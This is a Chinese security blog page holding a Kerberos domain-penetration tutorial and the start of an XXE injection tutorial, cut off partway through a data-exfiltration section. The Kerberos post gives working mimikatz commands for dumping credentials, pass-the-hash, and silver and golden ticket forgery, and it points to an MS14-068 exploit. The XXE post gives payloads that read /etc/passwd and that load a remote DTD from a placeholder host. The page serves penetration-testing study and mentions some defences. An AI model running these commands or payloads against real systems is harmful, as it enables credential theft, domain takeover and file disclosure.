<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-域渗透---黄金白银票据伪造" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/" class="article-date">
  <time datetime="2022-09-25T08:06:46.000Z" itemprop="datePublished">2022-09-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/">域渗透---黄金白银票据伪造</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="域渗透—黄金白银票据伪造"><a href="#域渗透—黄金白银票据伪造" class="headerlink" title="域渗透—黄金白银票据伪造"></a>域渗透—黄金白银票据伪造</h1><h2 id="一、域内协议Kerberos"><a href="#一、域内协议Kerberos" class="headerlink" title="一、域内协议Kerberos"></a>一、域内协议<code>Kerberos</code></h2><p>​    在域环境中，一般使用<code>Kerberos</code>来作为身份认证的一种协议。其实<code>NTLM</code>协议也存在于域环境中。两种协议共存，针对不同的协议，也就有了不同的攻击方式。</p>
<h3 id="1、传统的Kerberos认证模型"><a href="#1、传统的Kerberos认证模型" class="headerlink" title="1、传统的Kerberos认证模型"></a>1、传统的<code>Kerberos</code>认证模型</h3><p>​    首先来介绍一下<code>Kerberos</code>认证的模型：</p>
<p><img src="./image-20211201103044080.png" alt="image-20211201103044080"></p>
<p>​    在<code>Kerberos</code>认证环境下，主要存在三种角色，分别为客户端、服务端以及<code>KDC</code>即密钥分发中心。在域环境中，<code>KDC</code>存在于<code>DC</code>上面。客户端想要访问服务端上的某些服务，首先需要向<code>KDC</code>申请一张<code>TGT</code>票据，然后使用此票据去申请访问目标服务的<code>TGS</code>票据，最后拿着<code>TGS</code>票据，去访问服务端从而完成验证。</p>
<p>大致的认证流程为：</p>
<h4 id="（1）申请TGT-AS-REQ-AS-REP"><a href="#（1）申请TGT-AS-REQ-AS-REP" class="headerlink" title="（1）申请TGT: AS_REQ/AS_REP"></a>（1）申请<code>TGT</code>: <code>AS_REQ/AS_REP</code></h4><p>​    客户端想要访问服务端上的某个服务，首先会将自己的身份信息发送给<code>KDC</code>。<code>KDC</code>获取到信息之后，会进行一次验证，查看用户是否存在于白名单中，然后从本地提取出相应用户的<code>NTLM Hash</code>，并生成一个随机字符串<code>Session Key</code>。</p>
<p>​    接下来<code>KDC</code>会返回给客户端信息，该信息主要有两个部分，一部分为用户自身<code>NTLM Hash</code>加密<code>Session Key</code>后的值，另一部分为<code>KDC</code>中的一个默认账号<code>krbtgt</code>的<code>NTLM Hash</code>加密的<code>Session Key</code>和客户端的一些信息的值。（我们把第二部分信息称之为<code>TGT</code>）</p>
<h4 id="（2）申请ST-TGS-REQ-TGS-REP"><a href="#（2）申请ST-TGS-REQ-TGS-REP" class="headerlink" title="（2）申请ST: TGS_REQ/TGS_REP"></a>（2）申请<code>ST</code>: <code>TGS_REQ/TGS_REP</code></h4><p>​    客户端收到上面两部分信息之后，会将第一部分进行一个解密操作，从中提取出来<code>Session Key</code>。然后使用此<code>Session Key</code>加密自身的部分信息加上时间戳，并将其连同<code>TGT</code>发送给<code>KDC</code>。</p>
<p>​    <code>KDC</code>接收到这两部分信息之后，会先解密<code>TGT</code>并从中提取出<code>Session Key</code>和客户信息，然后使用得到的<code>Session Key</code>去解密第一部分信息，然后对比客户端信息从而完成认证。</p>
<p>​    之后<code>KDC</code>会生成一个新的<code>Server Session Key</code>，然后向客户端返回两部分主要信息，一个是客户端的<code>NTLM Hash</code>加密的<code>Server Session Key</code>的值，另一部分是服务端对应<code>NTLM Hash</code>加密的<code>Server Session Key</code>和客户端信息。（我们将第二部分信息称之为<code>ST</code>）</p>
<h4 id="（3）申请服务访问"><a href="#（3）申请服务访问" class="headerlink" title="（3）申请服务访问"></a>（3）申请服务访问</h4><p>​    客户端获取到返回回来的两部分内容之后，会得到<code>Server Session Key</code>，然后使用此<code>Server Session Key</code>加密自身的一些信息以及时间戳，连同<code>ST</code>一同发送给服务端。</p>
<p>​    服务端收到这两部分信息之后，会解密<code>ST</code>，然后解密第一部分信息，对比两部分信息的客户端信息，从而完成认证。</p>
<h3 id="2、引入PAC特权属性证书"><a href="#2、引入PAC特权属性证书" class="headerlink" title="2、引入PAC特权属性证书"></a>2、引入<code>PAC</code>特权属性证书</h3><p>​    上面是一个很典型的<code>Kerberos</code>认证模型，但是有一个问题没有解决，那就是如何确定该用户是否有权限访问目标服务。为此，微软引进了<code>PAC</code>来进行权限访问控制。</p>
<p>​    引入<code>PAC</code>后，当客户端向<code>KDC</code>申请<code>TGT</code>票据的时候，<code>KDC</code>会将<code>PAC</code>封装到<code>TGT</code>中，也就是说此时的<code>TGT</code>新增了一部分内容。而<code>PAC</code>中会包含用户的<code>sid</code>和用户所属的组。当用户拿着<code>TGT</code>去申请<code>ST</code>的时候，<code>KDC</code>会将<code>PAC</code>也同时封装到<code>ST</code>中。在最后一步进行访问服务的时候，用户发送<code>ST</code>，服务端获取后进行解密，并从中提取出来<code>PAC</code>，然后发送给域控进行权限的认证，查询用户是否有权限访问该服务。</p>
<p>​    大致整理一下，就是当用户申请两张票据的时候，即<code>TGT</code>和<code>ST</code>的时候，<code>KDC</code>会将生成的<code>PAC</code>封装到票据中。然后在最后一步进行权限的校验。</p>
<p><img src="./image-20211215100339954.png" alt="image-20211215100339954"></p>
<p>​    通过上面的认证方式，可以思考一下，如果可以伪造<code>TGT</code>的话，我们最终可以完成认证吗？或者任意伪造<code>    ST</code>，是否能完成认证。</p>
<p>​    通常而言，利用<code>NTLM</code>协议来实现<code>PTH</code>哈希传递攻击，或者使用中继攻击，而<code>Kerberos</code>协议，一般用来做票据伪造，完成权限维持。</p>
<h2 id="二、PTH哈希传递攻击（扩展）"><a href="#二、PTH哈希传递攻击（扩展）" class="headerlink" title="二、PTH哈希传递攻击（扩展）"></a>二、<code>PTH</code>哈希传递攻击（扩展）</h2><p>​    在介绍票据伪造之前，首先了解一下<code>PTH</code>哈希传递攻击。</p>
<p>​    我们知道，在域环境中，<code>NTLM</code>认证和<code>Kerberos</code>认证是共存的，在使用<code>NTLM </code>认证的时候，如果我们通过某些手段获取到了<code>NTLM Hash</code>，就可以直接通过<code>PTH</code>攻击，横向到其他主机上面。</p>
<p>​    当我们获取到域内一台主机的权限之后，可以利用像<code>mimikatz</code>这样的工具，从本地内存中提取出来用户的<code>Hash</code>值，然后通过<code>PTH</code>登录到其他主机上面。但<code>PTH</code>攻击也存在一定的限制：</p>
<p>​    1、在工作组环境下，<code>Windows Vista</code>之后的机器，只能是<code>administrator</code>用户的<code>Hash</code>可以进行<code>PTH</code>攻击。</p>
<p>​    2、在域环境中，只能是域管理员组内用户的<code>Hash</code>可以进行<code>PTH</code>攻击。</p>
<p>接下来做一个实践操作：（实验拓扑环境）</p>
<p><img src="./image-20211201113446291.png" alt="image-20211201113446291"></p>
<p>通过<code>PTH</code>哈希传递攻击，从<code>PC</code>横向移动到<code>PC1</code>主机上面。</p>
<p>首先在<code>PC</code>上使用<code>mimikatz</code>导出内存中存在的<code>Hash</code>值：（需要管理员执行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p><img src="./image-20211201214643602.png" alt="image-20211201214643602"></p>
<p>​    使用<code>mimikatz</code>进行<code>PTH</code>攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:god.org /ntlm:81be2f80d568100549beac645d6a7141&quot;</span><br></pre></td></tr></table></figure>

<p><img src="./image-20211201214540589.png" alt="image-20211201214540589"></p>
<p>​    攻击成功之后，会有一个新的<code>CMD</code>窗口弹出，在这个<code>CMD</code>中，就可以利用<code>SMB</code>协议直接连接到其他主机进行命令执行等操作。</p>
<h2 id="三、白银票据伪造"><a href="#三、白银票据伪造" class="headerlink" title="三、白银票据伪造"></a>三、白银票据伪造</h2><p>​    当我们获取到域内一台服务器的域用户<code>NTLM Hash</code>之后，就可以对<code>ST</code>票据进行伪造。在前面的<code>Kerberos</code>认证模型中，<code>ST</code>是经过目标服务器的<code>NTLM Hash</code>加密的，在最后进行验证的时候，服务器会解密<code>ST</code>，从中取出用户信息，然后和客户端发送的用户信息做一个对比，完成验证。因此，如果获取到目标服务端的<code>NTLM Hash</code>，那么这两段客户端发送的信息都可以进行伪造。（这里注意一点：是目标服务器的<code>NTLM Hash</code>，而不是域内用户的<code>NTLM Hash</code>）</p>
<p>​    利用<code>mimikatz</code>来进行票据的伪造，需要获取到一些参数值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、/domain: 指定域名</span><br><span class="line">2、/sid: 客户端用户的sid号</span><br><span class="line">3、/target: 需要访问的域服务器的计算机全名</span><br><span class="line">4、/rc4: 目标服务器的NTLM Hash值</span><br><span class="line">5、/service：需要伪造的服务，例如cifs访问文件服务</span><br><span class="line">6、/user: 指定需要伪造的用户</span><br><span class="line">7、/ptt: 将伪造的票据导入内存</span><br></pre></td></tr></table></figure>

<p>​    接下来模拟一个场景，在域环境中，得到了域控主机账号的<code>NTLM Hash</code>值，然后尝试利用白银票据的伪造，访问域控上的文件服务列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /rc4:f3d61310119eac428972d5e70ee7105f /service:cifs /user:Administrator /ptt</span><br></pre></td></tr></table></figure>

<p><img src="./image-20211215113319557.png" alt="image-20211215113319557"></p>
<p>​    这里有两个小坑，一个就是<code>sid</code>，另外一个就是目标机器的<code>NTLM Hash</code>:</p>
<p>（1）<code>sid</code>值：这里需要指定域内的<code>sid</code>值，我们可以通过<code>whoami /all</code>来进行查询</p>
<p><img src="./image-20211215141956130.png" alt="image-20211215141956130"></p>
<p>（2）目标机器的<code>NTLM Hash</code>值，而不是域内账号的<code>NTLM Hash</code>值。刚开始在做实验的时候，拿着域管的<code>NTLM Hash</code>去生成白银票据，发现是不能进行横向移动的。这里需要指定机器的<code>NTLM Hash</code>值，也就是说需要指定机器本地账户的<code>NTLM Hash</code>值。通常情况下，例如目标机器名为<code>m1sn0w</code>，那么这里需要指定的<code>NTLM Hash</code>值应该为<code>m1sn0w$</code>账号对应的<code>NTLM Hash</code>值。</p>
<p>​    在域环境中，可以开启<code>PAC</code>来预防白银票据的伪造，因为在整个<code>Kerberos</code>认证的模型中，如果开启了<code>PAC</code>，在最后验证<code>ST</code>的时候就会向域控发起验证，那么伪造的<code>ST</code>也就不会生效了。</p>
<h2 id="四、黄金票据伪造"><a href="#四、黄金票据伪造" class="headerlink" title="四、黄金票据伪造"></a>四、黄金票据伪造</h2><p>​    在<code>Kerberos</code>中，申请到的<code>TGT</code>票据是由<code>KDC</code>中的一个特定账号<code>krbtgt</code>的<code>NTLM Hash</code>加密的。如果我们获取到<code>krbtgt</code>的<code>NTLM Hash</code>值，那么就可以伪造<code>TGT</code>票据。当<code>TGT</code>票据可以伪造之后，我们就可以拿着这张票据去申请<code>ST</code>，从而访问域内的其他服务器。相比于白银票据的伪造，黄金票据更适合用来做权限维持，当我们获取到<code>krbtgt</code>的<code>NTLM Hash</code>之后，就可以访问域内的所有其他主机。</p>
<p>​    使用<code>mimikatz</code>来制作<code>TGT</code>票据，需要指定几个参数值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、/user: 指定伪造的用户名，一般是administrator</span><br><span class="line">2、/sid: 域的sid值</span><br><span class="line">3、/domain: 指定域名</span><br><span class="line">4、/krbtgt: 域内用户krbtgt的ntlm hash值</span><br></pre></td></tr></table></figure>

<p>​    当我们获取到<code>krbtgt</code>的<code>NTLM Hash</code>之后，就可以利用<code>mimikatz</code>来制作黄金票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /sid:域内sid /krbtgt:ntlm-hash /domain:域名</span><br></pre></td></tr></table></figure>

<p><img src="./image-20211215134910572.png" alt="image-20211215134910572"></p>
<p>可以使用<code>klist</code>命令查看内存中的票据。当制作完成黄金票据之后，就可以访问域内的其他主机，包括域控主机：</p>
<p><img src="./image-20211215135211973.png" alt="image-20211215135211973"></p>
<p>​    上述实验只是说明了，制作黄金票据之后，就可以访问域内的其他主机。在实际场景下，我们想要达到的效果是横向移动到其他机器上面，可以进行命令执行等操作。这里可以利用<code>PsExec</code>工具来进行横向攻击：下载地址（<code>https://download.sysinternals.com/files/PSTools.zip</code>）</p>
<p><img src="./image-20211215140749885.png" alt="image-20211215140749885"></p>
<p>​    总的来说，黄金票据的伪造就是使用到了<code>krbtgt</code>的<code>hash</code>值，因此关于这种风险的预防以及修复，可以围绕着<code>krbtgt</code>进行，例如可以禁用该账户，或者定期修改该用户的值。</p>
<h2 id="五、MS14-068漏洞"><a href="#五、MS14-068漏洞" class="headerlink" title="五、MS14-068漏洞"></a>五、<code>MS14-068</code>漏洞</h2><p>​    这是一个非常经典的漏洞，它可以将域用户提升为域管理员。其原理就是利用了微软在加入<code>PAC</code>之后，没有进行严格的流程控制，从而导致了漏洞的产生。补丁编号为<code>KB3011780</code>。（虽然该漏洞可能以后会见的很少，但是它很经典）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看补丁状况</span><br><span class="line">wmic qfe GET hotfixid | findstr /C:&quot;KB3011780&quot;</span><br><span class="line"></span><br><span class="line"># 使用systeminfo也可以查看补丁状态</span><br></pre></td></tr></table></figure>

<p>​    先谈一谈<code>MS14-068</code>漏洞的原理。前面说到过，为了解决在<code>Kerberos</code>认证模型中权限控制的问题，微软引入了<code>PAC</code>特权属性证书。简单理解一下<code>PAC</code>，它由4个部分组成，即：<code>Client</code>的<code>User</code>的<code>SID</code>、<code>Group</code>的<code>SID</code>、<code>Server Signature</code>、<code>KDC Signature</code>。后面两部分是签名信息，是为了防止证书被篡改。</p>
<p>​    引入<code>PAC</code>之后的<code>Kerberos</code>协议模型前面已经介绍。但微软在实现这个认证的过程中犯了3个错误，从而导致了漏洞的产生：</p>
<p>​    （1）<code>KDC</code>在对<code>PAC</code>进行验证的时候，也就是验证是否被篡改时，微软允许了客户端指定任意签名算法。</p>
<p>​    （2）<code>PAC</code>可以连同<code>TGS_REQ</code>一同发送给<code>TGS</code>，而不需要将<code>PAC</code>封装到<code>TGT</code>中，仍然能够正常解析。</p>
<p>​    （3）构造特殊的<code>TGS_REQ</code>请求，当验证完成之后会返回新的<code>TGT</code></p>
<p>​    因此，整个的攻击流程如下：</p>
<p>（1）构造<code>AS_REQ</code>，接收<code>AS_REP</code></p>
<p>​    这里在发送<code>AS_REQ</code>的时候，将<code>include-PAC</code>设置为<code>false</code>。这样在接收<code>AS_REP</code>后，获得的<code>TGT</code>中是不包含<code>PAC</code>证书的。</p>
<p>（2）构造<code>PAC</code>连同<code>TGS_REQ</code>一起发送</p>
<p>​    构造拥有高权限用户的<code>PAC</code>证书，并且签名采用<code>md5</code>的方式。然后将构造的<code>PAC</code>放置到<code>TGS_REQ</code>的<code>body</code>中，并用一个<code>subkey</code>进行加密（<code>TGS_REQ</code>的<code>Authenticator</code>字段带有<code>subkey</code>值），同时也会带上第一步请求的<code>TGT</code>一同传递给<code>KDC</code>。</p>
<p>（3）<code>KDC</code>解析<code>TGS_REQ</code></p>
<p>​    <code>KDC</code>使用<code>subkey</code>解密<code>PAC</code>并进行验证，验证通过之后会解密<code>TGT</code>，从中取出<code>Session key</code>，然后返回给客户端一个新的<code>TGT</code>（这个<code>TGT</code>中就会封装用户伪造的高权限<code>PAC</code>证书）</p>
<p>（4）申请<code>ST</code>访问服务</p>
<p>​    客户端接收到新的<code>TGT</code>之后，拿着这个<code>TGT</code>去再次去<code>KDC</code>申请<code>ST</code>，然后就可以利用<code>ST</code>访问特定的服务，并且拥有高权限。</p>
<p>下面对漏洞进行一个简单的复现：利用<code>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</code></p>
<p><img src="./image-20211215163017787.png" alt="image-20211215163017787"></p>
<p>通过<code>mimikatz</code>将文件导入内存即可：</p>
<p><img src="./image-20211215163108057.png" alt="image-20211215163108057"></p>
<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​    无论使用黄金票据还是白银票据做权限维持，还是横向移动，个人认为还是需要结合一定的场景。比如在域内做信息收集的时候，获取到目标服务器的<code>Hash</code>值，那么就可以利用白银票据做横向移动。同样，当获取到域控之后，为了完成权限的维持，可以将<code>krbtgt</code>的值记录下来，下次就可以之间进行提权操作。</p>
<h2 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h2><p>【1】哈希传递攻击：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103941590">https://blog.csdn.net/qq_36119192/article/details/103941590</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/" data-id="cl8h2gj950008fgdp2hn0712d" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-XXE外部实体注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-08-10T07:31:26.000Z" itemprop="datePublished">2022-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XXE外部实体注入漏洞"><a href="#XXE外部实体注入漏洞" class="headerlink" title="XXE外部实体注入漏洞"></a>XXE外部实体注入漏洞</h1><h2 id="一、XML格式解析"><a href="#一、XML格式解析" class="headerlink" title="一、XML格式解析"></a>一、XML格式解析</h2><p><code>XML</code>是一种非常流行的标记语言，它通常应用于配置文件。<code>XML</code>文档有自己的格式规范，它由<code>DTD(Document Type Definition)</code>进行控制。</p>
<p><code>DTD</code>可以包含在<code>XML</code>源文件中，也可以包含在其他文件中，通常定义的方式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">	&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<p><code>ELEMENT</code>用于定义元素，上面表示定义了元素的子元素以及各个元素的类型。</p>
<p>元素的类型主要有两种，一种是<code>#PCDATA</code>，另外一种是<code>#CDATA</code>，两种的区别是前者会进行解析文本，展开实体检查标记，后者表示纯当作字符串进行处理。类比常见的高级语言编程，双引号里面会解析变量，而单引号里面会被直接当成字符串。</p>
<p>如果需要包含外部的<code>DTD</code>，格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYE note SYSTEM &quot;external.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;m1sn0w&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;m1sn0w&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># external.dtd文件内容如下：</span><br><span class="line">&lt;!ELEMENT note (to,from)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<p>简单理解一下，就是将内部引入的<code>[]</code>中的内容替换成了<code>SYSTEM &quot;external.dtd&quot;</code>中的内容。</p>
<p>对于<code>XXE</code>漏洞来说，关键部分就是实体声明部分。实体的定义，即<code>用于定义引用普通文本或特殊字符的快捷方式的变量</code>，也就是说，实体是一个变量。分为内部实体和外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 内部实体</span><br><span class="line">&lt;!ENTITY element &quot;m1sn0w&quot;&gt;</span><br><span class="line">&lt;a&gt;&amp;element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>当需要在标签中进行引用实体的时候，需要用到<code>&amp;+实体名+；</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 外部实体</span><br><span class="line">&lt;!ENTITY element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>除了上述的实体引入外，还可以使用参数实体，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % element SYSTEM &quot;http://xxx/1.dtd&quot;&gt;</span><br><span class="line">&lt;a&gt;%element;&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h2 id="二、外部实体注入"><a href="#二、外部实体注入" class="headerlink" title="二、外部实体注入"></a>二、外部实体注入</h2><p><code>XXE</code>漏洞主要利用的就是引入外部实体的方式，<code>XML</code>协议的支持如下：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220104209699.png" alt="image-20211220104209699"></p>
<h3 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h3><h4 id="（1）有回显的读取敏感文件"><a href="#（1）有回显的读取敏感文件" class="headerlink" title="（1）有回显的读取敏感文件"></a>（1）有回显的读取敏感文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;file:///etc/passswd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;file;&lt;/m1sn0w&gt;</span><br></pre></td></tr></table></figure>

<p>​    在某些情况下，一些敏感文件中含有一些特殊的字符，例如<code>&gt;</code>，<code>&lt;</code>，<code>&amp;</code>等，这个时候如果直接对其进行外部引用，可能会导致<code>XML</code>解析出错，为了避免这种情况，可以使用<code>CDATA</code>，也就是将引用的外部文件都只当成字符串，而不去解析运行，这样就可以达到文件读取的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 通常CDATA数据的格式为：</span><br><span class="line">&lt;![CDATA[&quot;xxxxxx&quot;]]&gt;</span><br><span class="line"></span><br><span class="line"># 敏感文件读取payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE m1sn0w [</span><br><span class="line">	&lt;!ENTITY % a &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % b SYSTEM &quot;file:///file&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % c &quot;]]&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % d SYSTEM &quot;http://ip/a.dtd&quot;&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;m1sn0w&gt;&amp;all;&lt;/m1sn0w&gt;</span><br><span class="line"></span><br><span class="line"># a.dtd文件内容为</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%a;%b;%c;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这里主要是有一个拼接，利用<code>CDATA</code>来获取字符串，再次加载到本地<code>DTD</code>中，然后进行一个引用。</p>
<h4 id="（2）无回显读取本地敏感文件"><a href="#（2）无回显读取本地敏感文件" class="headerlink" title="（2）无回显读取本地敏感文件"></a>（2）无回显读取本地敏感文件</h4><p>​    在某些情况下，可能我们可以加载外部实体，但是页面没有回显。此时想要读取文件内容，有一个方法就是将数据外带。利用<code>XXE</code>向外部发送请求，同时将读取到的内容发送至远程服务端。</p>
<p>​    但由于在同一个<code>xml</code>文件中，在内部实体定义中去引用另外一个参数实体是不允许的，也就是下面这种情况：</p>
